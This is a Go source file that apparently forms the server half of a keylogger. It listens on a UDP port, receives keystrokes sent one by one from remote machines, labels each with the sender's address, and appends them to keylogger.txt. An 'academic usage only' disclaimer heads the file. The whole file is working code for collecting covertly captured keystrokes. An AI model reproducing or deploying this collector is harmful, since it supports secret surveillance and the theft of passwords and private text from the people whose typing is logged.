// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"fmt"
	"net"
	"os"
)

const (
	Protocol = "udp"
	Address  = "127.0.0.1:8722"

	Filename = "keylogger.txt"

	ExitResolveUDPAddr = iota + 1
	ExitListenUDP
	ExitOpenFile
)

var (
	conn *net.UDPConn
	file *os.File
)

func init() {
	var err error
	// Create UDP end point for listening.
	laddr, err := net.ResolveUDPAddr(Protocol, Address)
	if err != nil {
		fmt.Printf("Failed to resolve UDP address: %s\n", err.Error())
		os.Exit(ExitResolveUDPAddr)
	}
	// Create connection for listening.
	conn, err = net.ListenUDP(Protocol, laddr)
	if err != nil {
		fmt.Printf("Failed to listen UDP: %s\n", err.Error())
		os.Exit(ExitListenUDP)
	}
	// Open file to append data, create if file does not exist.
	file, err = os.OpenFile(Filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, os.ModePerm)
	if err != nil {
		defer conn.Close()
		fmt.Printf("Failed to open file: %s\n", err.Error())
		os.Exit(ExitOpenFile)
	}
}

func main() {
	defer conn.Close()
	defer file.Close()
	fmt.Print("Start listening...")
	isAddrWritten := false // for checking if address is required to be written
	for {
		buffer := make([]byte, 1024)
		// Read buffers.
		n, raddr, err := conn.ReadFromUDP(buffer)
		if err != nil {
			fmt.Printf("Failed to read from UDP: %s\n", err.Error())
			continue
		}
		// The characters will be sent one by one. After the conversion of bufString([]byte), some characters will be
		// converted to a plain string, use it to format and write.
		if len(bufString(buffer[:n])) == 1 {
			// Check if the address has been written.
			if !isAddrWritten {
				_, _ = file.WriteString(fmt.Sprintf("[%s] ", raddr))
				isAddrWritten = true
			}
			// Append data.
			_, _ = file.WriteString(bufString(buffer[:n]))
		} else {
			// If the address has been written, start a new line.
			if isAddrWritten {
				_, _ = file.WriteString("\n")
				isAddrWritten = false
			}
			// Append data with address.
			_, _ = file.WriteString(fmt.Sprintf("[%s] %s\n", raddr, bufString(buffer[:n])))
		}
	}
}

// bufString converts some characters to plain strings.
func bufString(b []byte) string {
	switch string(b) {
	case "\t":
		return "<tab>"
	case "\r":
		return "<enter>"
	case "\b":
		return "<backspace>"
	default:
		return string(b)
	}
}
